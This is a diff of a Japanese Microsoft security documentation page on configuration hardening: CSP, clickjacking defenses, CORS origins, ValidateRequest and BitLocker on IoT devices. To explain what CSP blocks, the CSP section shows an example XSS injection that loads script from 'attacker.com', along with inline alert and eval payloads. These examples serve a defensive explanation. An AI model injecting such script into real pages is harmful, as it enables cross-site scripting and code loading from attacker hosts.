@@ -17,27 +17,27 @@ ms.topic: article
 ms.date: 02/07/2017
 ms.author: jegeib
 ms.custom: devx-track-js, devx-track-csharp
-ms.openlocfilehash: 8cbe6b39bda0815c4981c497c07750136bcc9dba
-ms.sourcegitcommit: f28ebb95ae9aaaff3f87d8388a09b41e0b3445b5
+ms.openlocfilehash: 0f5eb88a3694e492f01dcf8646753a522f7c478c
+ms.sourcegitcommit: 106f5c9fa5c6d3498dd1cfe63181a7ed4125ae6d
 ms.translationtype: HT
 ms.contentlocale: ja-JP
-ms.lasthandoff: 03/29/2021
-ms.locfileid: "94517486"
+ms.lasthandoff: 11/02/2021
+ms.locfileid: "131064641"
 ---
 # <a name="security-frame-configuration-management--mitigations"></a>セキュリティ フレーム:構成管理 | 対応策 
 | 製品/サービス | [アーティクル] |
 | --------------- | ------- |
-| **Web アプリケーション** | <ul><li>[コンテンツ セキュリティ ポリシー (CSP) を実装し、インライン javascript を無効にする](#csp-js)</li><li>[ブラウザーの XSS フィルターを有効にする](#xss-filter)</li><li>[デプロイの前に ASP.NET アプリケーションでトレースおよびデバッグを無効にする](#trace-deploy)</li><li>[信頼できるソースのサード パーティ製 javascript にのみアクセスする](#js-trusted)</li><li>[認証された ASP.NET ページに、UI Redressing (クリックジャッキング) に対する防御が組み込まれていることを確認する](#ui-defenses)</li><li>[ASP.NET Web アプリケーションで CORS が有効になっている場合、信頼されたオリジンのみが許可されていることを確認する](#cors-aspnet)</li><li>[ASP.NET ページで ValidateRequest 属性を有効にする](#validate-aspnet)</li><li>[ローカルでホストされている最新の JavaScript ライブラリを使用する](#local-js)</li><li>[自動 MIME スニッフィングを無効にする](#mime-sniff)</li><li>[Windows Azure Web サイトで標準的なサーバー ヘッダーを削除して、フィンガープリントを残すことを回避する](#standard-finger)</li></ul> |
+| **Web アプリケーション** | <ul><li>[コンテンツ セキュリティ ポリシー (CSP) を実装し、インライン JavaScript を無効にする](#csp-js)</li><li>[ブラウザーの XSS フィルターを有効にする](#xss-filter)</li><li>[デプロイの前に ASP.NET アプリケーションでトレースおよびデバッグを無効にする](#trace-deploy)</li><li>[信頼できるソースからのみサード パーティ製 Javascript にアクセスする](#js-trusted)</li><li>[認証された ASP.NET ページに、UI Redressing (クリックジャッキング) に対する防御が組み込まれていることを確認する](#ui-defenses)</li><li>[ASP.NET Web アプリケーションで CORS が有効になっている場合、信頼されたオリジンのみが許可されていることを確認する](#cors-aspnet)</li><li>[ASP.NET ページで ValidateRequest 属性を有効にする](#validate-aspnet)</li><li>[ローカルでホストされている最新の JavaScript ライブラリを使用する](#local-js)</li><li>[自動 MIME スニッフィングを無効にする](#mime-sniff)</li><li>[Windows Azure Web サイトで標準的なサーバー ヘッダーを削除して、フィンガープリントを残すことを回避する](#standard-finger)</li></ul> |
 | **[データベース]** | <ul><li>[データベース エンジン アクセスを有効にするための Windows ファイアウォールを構成する](#firewall-db)</li></ul> |
 | **Web API** | <ul><li>[ASP.NET Web API で CORS が有効になっている場合、信頼されたオリジンのみが許可されていることを確認する](#cors-api)</li><li>[機密データを含む Web API の構成ファイルのセクションを暗号化する](#config-sensitive)</li></ul> |
-| **IoT デバイス** | <ul><li>[強力な資格情報ですべての管理インターフェイスが保護されていることを確認する](#admin-strong)</li><li>[不明なコードがデバイスで実行できないことを確認する](#unknown-exe)</li><li>[BitLocker で OS と IoT デバイスの追加のパーティションを暗号化する](#partition-iot)</li><li>[デバイスで有効になっているのが最小サービス/機能のみであることを確認する](#min-enable)</li></ul> |
-| **IoT フィールド ゲートウェイ** | <ul><li>[BitLocker で OS と IoT フィールド ゲートウェイの追加のパーティションを暗号化する](#field-bit-locker)</li><li>[インストール中にフィールド ゲートウェイの既定のログイン資格情報が変更されていることを確認する](#default-change)</li></ul> |
+| **IoT デバイス** | <ul><li>[強力な資格情報ですべての管理インターフェイスが保護されていることを確認する](#admin-strong)</li><li>[不明なコードがデバイスで実行できないことを確認する](#unknown-exe)</li><li>[BitLocker を使用して IoT デバイスの OS とその他のパーティションを暗号化する](#partition-iot)</li><li>[デバイスで有効になっているのが最小サービス/機能のみであることを確認する](#min-enable)</li></ul> |
+| **IoT フィールド ゲートウェイ** | <ul><li>[BitLocker を使用して IoT フィールド ゲートウェイの OS とその他のパーティションを暗号化する](#field-bit-locker)</li><li>[インストール中にフィールド ゲートウェイの既定のログイン資格情報が変更されていることを確認する](#default-change)</li></ul> |
 | **IoT クラウド ゲートウェイ** | <ul><li>[接続されているデバイスのファームウェアを最新の状態に保つためのプロセスが、クラウド ゲートウェイで実装されていることを確認する](#cloud-firmware)</li></ul> |
 | **コンピューターの信頼の境界** | <ul><li>[デバイスのエンドポイント セキュリティ制御が組織ポリシーに従って構成されていることを確認する](#controls-policies)</li></ul> |
 | **Azure ストレージ** | <ul><li>[Azure ストレージ アクセス キーの管理がセキュリティで保護されていることを確認する](#secure-keys)</li><li>[Azure Storage で CORS が有効になっている場合、信頼されたオリジンのみが許可されていることを確認する](#cors-storage)</li></ul> |
 | **WCF** | <ul><li>[WCF のサービス調整機能を有効にする](#throttling)</li><li>[WCF - メタデータからの情報の漏えい](#info-metadata)</li></ul> | 
 
-## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>コンテンツ セキュリティ ポリシー (CSP) を実装し、インライン javascript を無効にする
+## <a name="implement-content-security-policy-csp-and-disable-inline-javascript"></a><a id="csp-js"></a>コンテンツ セキュリティ ポリシー (CSP) を実装し、インライン JavaScript を無効にする
 
 | タイトル                   | 詳細      |
 | ----------------------- | ------------ |
@@ -46,7 +46,7 @@ ms.locfileid: "94517486"
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
 | **参照**              | [コンテンツ セキュリティ ポリシーの概要](https://www.html5rocks.com/en/tutorials/security/content-security-policy/)、[コンテンツ セキュリティ ポリシー リファレンス](https://content-security-policy.com/)、[セキュリティ機能](https://developer.microsoft.com/microsoft-edge/platform/documentation/dev-guide/security/)、[コンテンツ セキュリティ ポリシーの概要](https://github.com/webplatform/webplatform.github.io/tree/master/docs/tutorials/content-security-policy)、[CSP が使用可能か](https://caniuse.com/#feat=contentsecuritypolicy) |
-| **手順** | <p>コンテンツ セキュリティ ポリシー (CSP) は、W3C 標準の多層防御セキュリティ メカニズムです。このポリシーを使用すると、Web アプリケーション所有者が、自身のサイトに埋め込まれたコンテンツを制御できます。 CSP は、Web サーバー上で HTTP 応答ヘッダーとして追加され、ブラウザーによってクライアント側で適用されます。 これは許可リスト ベースのポリシーで、Web サイトが、信頼されたドメインのセットを宣言できます。このドメインから、JavaScript などのアクティブ コンテンツを読み込むことができます。</p><p>CSP のセキュリティ上の利点を次に示します。</p><ul><li>**XSS に対する保護:** ページが XSS に対して脆弱である場合、攻撃者がそれを悪用する方法は 2 つあります。<ul><li>`<script>malicious code</script>` を挿入する。 このエクスプロイトは、CSP の基本制限 1 により動作しません</li><li>`<script src="http://attacker.com/maliciousCode.js"/>` を挿入する。 攻撃者が制御するドメインは、ドメインの CSP の許可リストに追加されないため、このエクスプロイトは動作しません</li></ul></li><li>**データ流出の制御:** Web ページの悪意のあるコンテンツが外部 Web サイトに接続して、データを盗もうとすると、CSP によって接続が中断されます。 接続先ドメインは、CSP の許可リストに追加されないためです</li><li>**クリックジャッキングに対する防御:** クリックジャッキングは、敵が正規の Web サイトを偽装して、ユーザーに UI 要素を強制的にクリックさせる攻撃方法です。 現時点では、クリックジャッキングに対する防御は、X-Frame-Options 応答ヘッダーを構成することで実現します。 すべてのブラウザーがこのヘッダーを使用しているわけではありません。今後は、CSP がクリックジャッキングに対する標準的な防御方法になります</li><li>**リアルタイム攻撃レポート:** CSP 対応の Web サイトがインジェクション攻撃を受けると、Web サーバーで構成されているエンドポイントへの通知が自動的にトリガーされます。 このように、CSP は、リアルタイムの警告システムとして機能します。</li></ul> |
+| **手順** | <p>コンテンツ セキュリティ ポリシー (CSP) は、W3C 標準の多層防御セキュリティ メカニズムです。このポリシーを使用すると、Web アプリケーション所有者が、自身のサイトに埋め込まれたコンテンツを制御できます。 CSP は、Web サーバー上で HTTP 応答ヘッダーとして追加され、ブラウザーによってクライアント側で適用されます。 これは許可リストベースのポリシーであり、信頼されたドメインのセットを Web サイトで宣言できます。このドメインから、JavaScript などのアクティブ コンテンツを読み込むことができます。</p><p>CSP のセキュリティ上の利点を次に示します。</p><ul><li>**XSS に対する保護:** ページが XSS に対して脆弱である場合、攻撃者がそれを悪用する方法は 2 つあります。<ul><li>`<script>malicious code</script>` を挿入する。 このエクスプロイトは、CSP の基本制限 1 により動作しません</li><li>`<script src="http://attacker.com/maliciousCode.js"/>` を挿入する。 攻撃者が制御するドメインは、ドメインの CSP の許可リストに追加されないため、このエクスプロイトは動作しません</li></ul></li><li>**データ流出の制御:** Web ページの悪意のあるコンテンツが外部 Web サイトに接続して、データを盗もうとすると、CSP によって接続が中断されます。 接続先ドメインは、CSP の許可リストに追加されないためです</li><li>**クリックジャッキングに対する防御:** クリックジャッキングは、敵が正規の Web サイトを偽装して、ユーザーに UI 要素を強制的にクリックさせる攻撃方法です。 現時点では、クリックジャッキングに対する防御は、X-Frame-Options 応答ヘッダーを構成することで実現します。 すべてのブラウザーがこのヘッダーを使用しているわけではありません。今後は、CSP がクリックジャッキングに対する標準的な防御方法になります</li><li>**リアルタイム攻撃レポート:** CSP 対応の Web サイトがインジェクション攻撃を受けると、Web サーバーで構成されているエンドポイントへの通知が自動的にトリガーされます。 このように、CSP は、リアルタイムの警告システムとして機能します。</li></ul> |
 
 ### <a name="example"></a>例
 サンプル ポリシー: 
@@ -57,15 +57,15 @@ Content-Security-Policy: default-src 'self'; script-src 'self' www.google-analyt
 
 ### <a name="example"></a>例
 インライン スクリプトが実行されません。 インライン スクリプトの例を次に示します 
-```javascript
+```JavaScript
 <script> some Javascript code </script>
-Event handling attributes of HTML tags (e.g., <button onclick="function(){}">
+Event handling attributes of HTML tags (for example, <button onclick="function(){}">
 javascript:alert(1);
 ```
 
 ### <a name="example"></a>例
 文字列はコードとして評価されません。 
-```javascript
+```JavaScript
 Example: var str="alert(1)"; eval(str);
 ```
 
@@ -91,7 +91,7 @@ Example: var str="alert(1)"; eval(str);
 | **参照**              | [ASP.NET デバッグの概要](/previous-versions/ms227556(v=vs.140))、[ASP.NET トレースの概要](/previous-versions/bb386420(v=vs.140))、[方法:ASP.NET アプリケーションのトレースを有効にする](/previous-versions/0x5wc973(v=vs.140))、[方法:ASP.NET アプリケーションのデバッグを有効にする](https://msdn.microsoft.com/library/e8z01xdh(VS.80).aspx) |
 | **手順** | ページのトレースが有効になっていると、それを要求しているブラウザーも、内部サーバーの状態とワークフローのデータを含むトレース情報をそれぞれ取得します。 それが機密情報であることがあります。 ページでデバッグが有効になっている場合、サーバーでエラーが発生すると、ブラウザーに完全なスタック トレース データのサーバーが提供されます。 そのデータによって、サーバーのワークフローに関する機密情報が公開される場合があります。 |
 
-## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>信頼できるソースのサード パーティ製 javascript にのみアクセスする
+## <a name="access-third-party-javascripts-from-trusted-sources-only"></a><a id="js-trusted"></a>信頼できるソースからのみサード パーティ製 Javascript にアクセスする
 
 | タイトル                   | 詳細      |
 | ----------------------- | ------------ |
@@ -111,7 +111,7 @@ Example: var str="alert(1)"; eval(str);
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
 | **参照**              | [OWASP: クリックジャッキング対策に関するチートシート](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html)、[IE Internals - X-Frame-Options によるクリックジャッキングへの対応](/archive/blogs/ieinternals/combating-clickjacking-with-x-frame-options) |
-| **手順** | <p>クリックジャッキング (UI Redressing 攻撃) では、攻撃者は透明または不透明な複数のレイヤーを使用して、実際のページではなく、その上にある別のページのボタンやリンクをユーザーにクリックさせようとします。</p><p>このレイヤーは iframe で悪意のあるページを作成することで実現し、これにより攻撃対象のページが読み込まれます。 つまり、攻撃者は、攻撃対象ユーザーのページ クリックを "ハイジャック" して、そのユーザーを別のページ (ほとんどの場合、他のアプリケーションまたはドメイン、あるいはその両方が所有するページ) に誘導します。 クリックジャッキング攻撃を防ぐには、他のドメインからのフレーミングを許可しないようブラウザーに指示する、適切な X-Frame-Options HTTP 応答ヘッダーを設定します。</p>|
+| **手順** | <p>クリックジャッキング (UI Redress 攻撃) では、攻撃者は透明または不透明な複数のレイヤーを使用して、実際のページではなく、その上にある別のページのボタンやリンクをユーザーにクリックさせようとします。</p><p>このレイヤーは iframe で悪意のあるページを作成することで実現し、これにより攻撃対象のページが読み込まれます。 つまり、攻撃者は、攻撃対象ユーザーのページ クリックを "ハイジャック" して、そのユーザーを別のページ (ほとんどの場合、他のアプリケーションまたはドメイン、あるいはその両方が所有するページ) に誘導します。 クリックジャッキング攻撃を防ぐには、他のドメインからのフレーミングを許可しないようブラウザーに指示する、適切な X-Frame-Options HTTP 応答ヘッダーを設定します。</p>|
 
 ### <a name="example"></a>例
 X-FRAME-OPTIONS ヘッダーを設定するには、IIS web.config を使用します。フレーミングが許可されないサイトの Web.config コード スニペットは次のとおりです。 
@@ -150,7 +150,7 @@ X-FRAME-OPTIONS ヘッダーを設定するには、IIS web.config を使用し�
 
 ### <a name="example"></a>例
 Web.config にアクセスできる場合、CORS は、次のコードを使用して追加できます。 
-```XML
+```xml
 <system.webServer>
     <httpProtocol>
       <customHeaders>
@@ -166,7 +166,7 @@ Web.config にアクセスできない場合、CORS を構成するには、次�
 HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://example.com")
 ```
 
-重要なのは、"Access-Control-Allow-Origin" 属性のオリジンのリストを、必ず信頼できる有限オリジン セットに設定することです。 この構成が不適切だと (例: "*" に設定する)、悪意のあるサイトが、Web アプリケーションへのクロス オリジン要求を無制限にトリガーできるため、アプリケーションが CSRF 攻撃に対して脆弱になります。 
+"Access-Control-Allow-Origin" 属性のオリジンのリストが、確実に有限で信頼できる一連のオリジンに設定されていることが重要という点に注意してください。 この構成が不適切だと (例: "*" に設定する)、悪意のあるサイトが、Web アプリケーションへのクロス オリジン要求を無制限にトリガーできるため、アプリケーションが CSRF 攻撃に対して脆弱になります。 
 
 ## <a name="enable-validaterequest-attribute-on-aspnet-pages"></a><a id="validate-aspnet"></a>ASP.NET ページで ValidateRequest 属性を有効にする
 
@@ -181,11 +181,11 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 
 ### <a name="example"></a>例
 ただし、この機能は、ページ レベルで無効にできます。 
-```XML
+```xml
 <%@ Page validateRequest="false" %> 
 ```
 アプリケーション レベルでも無効にできます 
-```XML
+```xml
 <configuration>
    <system.web>
       <pages validateRequest="false" />
@@ -218,7 +218,7 @@ HttpContext.Response.AppendHeader("Access-Control-Allow-Origin", "https://exampl
 
 ### <a name="example"></a>例
 アプリケーションがインターネット インフォメーション サービス (IIS) 7 以降でホストされている場合は、web.config ファイルにヘッダーを追加します。 
-```XML
+```xml
 <system.webServer>
 <httpProtocol>
 <customHeaders>
@@ -365,7 +365,7 @@ public class ResourcesController : ApiController
 }
 ```
 
-重要なのは、"EnableCors" 属性のオリジンのリストを、必ず信頼できる有限オリジン セットに設定することです。 この構成が不適切だと (例: "*" に設定する)、悪意のあるサイトが、API へのクロス オリジン要求を無制限にトリガーできるため、API が CSRF 攻撃に対して脆弱になります。 EnableCors は、コントローラー レベルで修飾できます。 
+EnableCors 属性のオリジンのリストが、確実に有限で信頼できる一連のオリジンに設定されていることが重要という点に注意してください。 この構成が不適切だと (例: "*" に設定する)、悪意のあるサイトが、API へのクロス オリジン要求を無制限にトリガーできるため、API が CSRF 攻撃に対して脆弱になります。 EnableCors は、コントローラー レベルで修飾できます。 
 
 ### <a name="example"></a>例
 クラスの特定のメソッドで CORS を無効にするには、次に示すように DisableCors 属性を使用できます。 
@@ -468,7 +468,7 @@ public void ConfigureServices(IServiceCollection services)
     });
 }
 ```
-重要なのは、"EnableCors" 属性のオリジンのリストを、必ず信頼できる有限オリジン セットに設定することです。 この構成が不適切だと (例: "*" に設定する)、悪意のあるサイトが、API へのクロス オリジン要求を無制限にトリガーできるため、API が CSRF 攻撃に対して脆弱になります。 
+EnableCors 属性のオリジンのリストが、確実に有限で信頼できる一連のオリジンに設定されていることが重要という点に注意してください。 この構成が不適切だと (例: "*" に設定する)、悪意のあるサイトが、API へのクロス オリジン要求を無制限にトリガーできるため、API が CSRF 攻撃に対して脆弱になります。 
 
 ### <a name="example"></a>例
 コント ローラーまたはアクションに対して CORS を無効にするには、DisableCors 属性を使用します。 
@@ -513,7 +513,7 @@ public void ConfigureServices(IServiceCollection services)
 | **参照**              | [Windows 10 IoT Core でのセキュア ブートと BitLocker デバイス暗号化の有効化](/windows/iot-core/secure-your-device/securebootandbitlocker) |
 | **手順** | UEFI セキュア ブートでは、指定された機関によって署名されたバイナリの実行のみを許可するようにシステムを制限します。 この機能により、不明なコードがプラットフォームで実行できなくなり、コードによって、プラットフォームのセキュリティが低下する可能性を排除できます。 UEFI セキュア ブートを有効にして、コードに署名する信頼済み証明機関の一覧を制限し、 信頼された機関のいずれかを使用して、デバイスにデプロイされているすべてのコードに署名します。 |
 
-## <a name="encrypt-os-and-additional-partitions-of-iot-device-with-bit-locker"></a><a id="partition-iot"></a>BitLocker で OS と IoT デバイスの追加のパーティションを暗号化する
+## <a name="encrypt-os-and-other-partitions-of-iot-device-with-bitlocker"></a><a id="partition-iot"></a>BitLocker を使用して IoT デバイスの OS とその他のパーティションを暗号化する
 
 | タイトル                   | 詳細      |
 | ----------------------- | ------------ |
@@ -522,7 +522,7 @@ public void ConfigureServices(IServiceCollection services)
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
 | **参照**              | 該当なし  |
-| **手順** | Windows 10 IoT Core は、BitLocker デバイス暗号化の軽量バージョンを実装しており、必要な測定を行う UEFI の必要な preOS プロトコルを含む、プラットフォーム上の TPM の存在に強く依存します。 この preOS 測定により、以降の OS に、OS が起動された方法に関する明確なレコードが確実に保持されます。BitLocker を使用して OS のパーティションだけでなく、追加のパーティションも暗号化してください。このパーティションにも、機密データが格納されていることがあります。 |
+| **手順** | Windows 10 IoT Core は、BitLocker デバイス暗号化の軽量バージョンを実装しており、必要な測定を行う UEFI の必要な preOS プロトコルを含む、プラットフォーム上の TPM の存在に強く依存します。 この preOS 測定により、以降の OS に、OS が起動された方法に関する明確なレコードが確実に保持されます。BitLocker を使用して OS のパーティションだけでなく、その他のパーティションも暗号化してください。このパーティションにも、機密データが格納されていることがあります。 |
 
 ## <a name="ensure-that-only-the-minimum-servicesfeatures-are-enabled-on-devices"></a><a id="min-enable"></a>デバイスで有効になっているのが最小サービス/機能のみであることを確認する
 
@@ -535,7 +535,7 @@ public void ConfigureServices(IServiceCollection services)
 | **参照**              | 該当なし  |
 | **手順** | ソリューションに不要な機能やサービスは OS で有効にしないでください。つまりオフにします。 たとえば、デバイスで UI をデプロイする必要がない場合は、Windows IoT Core をヘッドレス モードでインストールします。 |
 
-## <a name="encrypt-os-and-additional-partitions-of-iot-field-gateway-with-bit-locker"></a><a id="field-bit-locker"></a>BitLocker で OS と IoT フィールド ゲートウェイの追加のパーティションを暗号化する
+## <a name="encrypt-os-and-other-partitions-of-iot-field-gateway-with-bitlocker"></a><a id="field-bit-locker"></a>BitLocker を使用して IoT フィールド ゲートウェイの OS とその他のパーティションを暗号化する
 
 | タイトル                   | 詳細      |
 | ----------------------- | ------------ |
@@ -544,7 +544,7 @@ public void ConfigureServices(IServiceCollection services)
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
 | **参照**              | 該当なし  |
-| **手順** | Windows 10 IoT Core は、BitLocker デバイス暗号化の軽量バージョンを実装しており、必要な測定を行う UEFI の必要な preOS プロトコルを含む、プラットフォーム上の TPM の存在に強く依存します。 この preOS 測定により、以降の OS に、OS が起動された方法に関する明確なレコードが確実に保持されます。BitLocker を使用して OS のパーティションだけでなく、追加のパーティションも暗号化してください。このパーティションにも、機密データが格納されていることがあります。 |
+| **手順** | Windows 10 IoT Core は、BitLocker デバイス暗号化の軽量バージョンを実装しており、必要な測定を行う UEFI の必要な preOS プロトコルを含む、プラットフォーム上の TPM の存在に強く依存します。 この preOS 測定により、以降の OS に、OS が起動された方法に関する明確なレコードが確実に保持されます。BitLocker を使用して OS のパーティションだけでなく、その他のパーティションも暗号化してください。このパーティションにも、機密データが格納されていることがあります。 |
 
 ## <a name="ensure-that-the-default-login-credentials-of-the-field-gateway-are-changed-during-installation"></a><a id="default-change"></a>インストール中にフィールド ゲートウェイの既定のログイン資格情報が変更されていることを確認する
 
@@ -565,7 +565,7 @@ public void ConfigureServices(IServiceCollection services)
 | **SDL フェーズ**               | Build |  
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | ゲートウェイの選択 - Azure IoT Hub |
-| **参照**              | [IoT Hub を使用したデバイス管理の概要](../../iot-hub/iot-hub-device-management-overview.md)、[デバイス ファームウェアの更新方法](../../iot-hub/tutorial-firmware-update.md) |
+| **参照**              | [IoT Hub デバイス管理の概要](../../iot-hub-device-update/device-update-agent-overview.md)、[Raspberry Pi 3 B+ 参照イメージを使用した Device Update for Azure IoT Hub のチュートリアル](../../iot-hub-device-update/device-update-raspberry-pi.md)。 |
 | **手順** | LWM2M は、IoT デバイス管理の Open Mobile Alliance のプロトコルです。 Azure の IoT デバイス管理では、デバイスのジョブを使用して物理デバイスと対話することができます。 Azure IoT Hub デバイス管理を使用して、デバイスおよびその他の構成データを定期的に最新の状態に保つためのプロセスが、クラウド ゲートウェイで実装されていることを確認します。 |
 
 ## <a name="ensure-that-devices-have-end-point-security-controls-configured-as-per-organizational-policies"></a><a id="controls-policies"></a>デバイスのエンドポイント セキュリティ制御が組織ポリシーに従って構成されていることを確認する
@@ -577,7 +577,7 @@ public void ConfigureServices(IServiceCollection services)
 | **適用できるテクノロジ** | ジェネリック |
 | **属性**              | 該当なし  |
 | **参照**              | 該当なし  |
-| **手順** | ディスク レベルの暗号化用の BitLocker、更新された署名を備えたウイルス対策、ホスト ベースのファイアウォール、OS アップグレード、グループ ポリシーなど、デバイスのエンドポイント セキュリティ制御が組織のセキュリティ ポリシーに従って構成されていることを確認します。 |
+| **手順** | ディスクレベルの暗号化用の BitLocker、更新された署名を備えたウイルス対策、ホストベースのファイアウォール、OS アップグレード、グループ ポリシーなど、デバイスのエンドポイント セキュリティ制御が組織のセキュリティ ポリシーに従って構成されていることを確認します。 |
 
 ## <a name="ensure-secure-management-of-azure-storage-access-keys"></a><a id="secure-keys"></a>Azure ストレージ アクセス キーの管理がセキュリティで保護されていることを確認する
 
